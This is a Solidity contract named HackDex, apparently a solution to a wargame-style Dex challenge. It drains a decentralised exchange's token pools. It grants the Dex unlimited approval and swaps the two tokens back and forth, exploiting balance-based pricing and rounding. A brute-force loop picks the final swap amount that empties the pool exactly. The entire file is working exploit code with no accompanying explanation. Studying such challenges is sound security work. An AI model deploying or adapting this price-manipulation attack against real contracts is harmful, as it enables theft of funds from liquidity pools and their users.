// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


import '@openzeppelin/contracts/math/SafeMath.sol';
import "./Dex.sol";


contract HackDex {

    using SafeMath for uint;

    Dex public dex;

    uint256 MAX_INT = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;

    constructor(address _dexAddress) public {
        dex = Dex(_dexAddress);
    }
    
    function hack() external {
        
        // Approve
        dex.approve(address(dex), MAX_INT);

        // Swap until balance is 0
        uint256 i = 0;
        address tkn1;
        address tkn2;
        uint256 amt;
        uint256 swpAmt;
        uint256 tkn2_bal_dex;
        uint256 swpAmt_i;

        while (dex.balanceOf(dex.token1(), address(dex)) > 0 && dex.balanceOf(dex.token2(), address(dex)) > 0) {

            if (i % 2 == 0) {
                tkn1 = dex.token1();
                tkn2 = dex.token2();
            } else {
                tkn1 = dex.token2();
                tkn2 = dex.token1();
            }

            amt = dex.balanceOf(tkn1, address(this));

            // Amount of tkn2 we will recieve
            swpAmt = dex.getSwapPrice(tkn1, tkn2, amt);

            tkn2_bal_dex = dex.balanceOf(tkn2, address(dex));
            if (swpAmt > tkn2_bal_dex) {
                // Find the amt value s.t. swpAmt == tkn2_bal_dex
                for (uint256 amt_i = 1; amt_i < amt; amt_i++) {
                    swpAmt_i = dex.getSwapPrice(tkn1, tkn2, amt_i);
                    if (swpAmt_i == tkn2_bal_dex) {
                        dex.swap(tkn1, tkn2, amt_i);
                        break;
                    }
                }
                break;
            } else {
                dex.swap(tkn1, tkn2, amt);
            }

            i++;
        }
    }
}